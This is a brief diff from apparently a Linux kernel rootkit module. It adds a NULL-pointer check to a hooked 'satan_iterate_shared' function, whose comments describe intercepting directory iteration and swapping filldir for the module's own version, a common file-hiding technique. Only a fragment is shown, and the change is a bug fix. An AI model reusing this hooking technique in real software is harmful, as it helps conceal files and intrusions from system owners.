@@ -388,6 +388,12 @@ static int satan_iterate_shared(struct file *filp, struct dir_context *ctx)
         // Get the real iterate_shared() of this directory from `real_iterate_shared_list`
         // which will be invoked very soon.
         real_iterate_shared = real_iterate_shared_list_get(basename);
+        
+        // real_iterate_shared can really be NULL.. not sure why.. yet.
+        if (!real_iterate_shared) {
+                return -1;
+        }
+
 
         // ->iterate_shared() will call ctx->actor, i.e., filldir()
         // Here we'll replace the original filldir() with our version of filldir().
